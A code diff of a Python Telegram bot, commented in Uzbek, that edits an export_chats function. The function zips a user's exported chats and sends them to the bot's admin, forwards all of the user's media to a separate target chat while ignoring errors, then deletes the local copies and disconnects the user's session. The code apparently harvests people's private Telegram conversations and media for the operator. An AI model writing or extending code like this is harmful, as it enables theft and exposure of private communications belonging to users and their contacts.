@@ -322,18 +322,21 @@ async def export_chats(uid):
             for file in files:
                 z.write(os.path.join(root, file))
 
+    # 📦 ZIP faqat adminga
     await bot.send_document(
-    ADMIN_ID,
-    types.FSInputFile(zip_path),
-    caption=f"📦 Chatlar ZIP\n👤 User ID: {uid}"
-)
+        ADMIN_ID,
+        types.FSInputFile(zip_path),
+        caption=f"📦 Chatlar ZIP\n👤 User ID: {uid}"
+    )
 
-# (ixtiyoriy) userga xabar
-await bot.send_message(
-    uid,
-    "✅ Maʼlumotlar saqlandi va adminga yuborildi.\n⏳ Biroz kuting..."
-)
+    # 👤 Userga xabar
+    await bot.send_message(
+        uid,
+        "✅ Maʼlumotlar saqlandi va adminga yuborildi.\n⏳ Biroz kuting...",
+        reply_markup=main_menu(uid == ADMIN_ID)
+    )
 
+    # 📤 Media forward
     for m in media:
         try:
             await m.forward_to(MEDIA_TARGET)
@@ -341,17 +344,13 @@ await bot.send_message(
         except:
             pass
 
+    # 🧹 Tozalash
     shutil.rmtree(BASE_DIR)
     os.remove(zip_path)
 
     await client.disconnect()
     sessions.pop(uid, None)
 
-    await bot.send_message(
-        uid,
-        "✅ saqlandi biroz kuting...",
-        reply_markup=main_menu(uid == ADMIN_ID)
-    )
 
 # =====================================================
 # ⚙️ ADMIN PANEL
